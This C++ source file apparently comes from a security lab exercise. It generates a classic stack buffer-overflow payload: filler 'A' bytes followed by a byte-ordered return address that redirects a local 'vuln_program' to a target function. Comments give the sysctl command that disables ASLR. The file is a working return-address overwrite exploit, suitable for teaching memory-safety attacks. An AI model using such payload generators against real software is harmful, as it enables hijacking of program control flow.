/* Disabling address space layout randomization (ASLR)
 * command:
 * sudo sysctl -w kernel.randomize_va_space=0
 * 
 * To analyze, use GDB or the command:
 * objdump -D ./vuln_program
 */

// On buf size 100
// char limit tested on this computer: 112 char - seg fault
//                                   : 111 char - okay

#include <iostream>
#include <sstream>

#define BUF_SIZE 100

int main(int argc, char *argv[]){

  if(argc > 2){
    std::cout << "Only first argument \"" << argv[1] << "\" will be taken\n";
  }else if(argc < 2){
    std::cout << "Need to give address of target function\n";
    std::cout << "Terminating program\n";
    return 0;
  }

  unsigned char ret[4];

  std::string trgt_addr = argv[1];
  std::string atk_name = "attack.input";
  std::string atk_str = "";
  int buffer = BUF_SIZE + (BUF_SIZE % 8) + (4 - (BUF_SIZE % 8)) + 8;

  auto it = trgt_addr.begin();
  int idx;
  for(it = trgt_addr.begin(), idx = 0; it < trgt_addr.end(); it+=2, idx++){
    std::string hex_rep = "";
    std::stringstream s;
    int hex;

    hex_rep.push_back(*it);
    hex_rep.push_back(*(it+1));
    s << hex_rep;
    s >> std::hex >> hex;
    ret[idx] = hex;
  }

  for(int i = 0;i<buffer;i++) atk_str += 'A';
  printf("%s", atk_str.c_str());

  int n = 1;
  // little endian if true
  if(*(char *)&n == 1){
    printf("%c%c%c%c", ret[3], ret[2], ret[1], ret[0]); 
  }else{
    printf("%c%c%c%c", ret[0], ret[1], ret[2], ret[3]);
  }

  return 0;
}
